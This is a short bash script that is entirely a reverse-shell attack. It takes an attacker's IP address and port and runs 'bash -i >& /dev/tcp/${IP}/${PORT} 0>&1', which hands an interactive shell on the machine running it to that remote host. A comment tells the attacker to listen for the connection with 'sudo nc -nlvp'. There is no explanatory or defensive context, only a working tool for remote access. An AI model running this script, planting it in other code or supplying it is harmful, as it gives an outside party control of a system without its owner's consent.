#!/usr/bin/env bash

IP=$1
PORT=$2

bash -i >& /dev/tcp/${IP}/${PORT} 0>&1


# the attacker must run this command, to have access
sudo nc -nlvp <PORT>
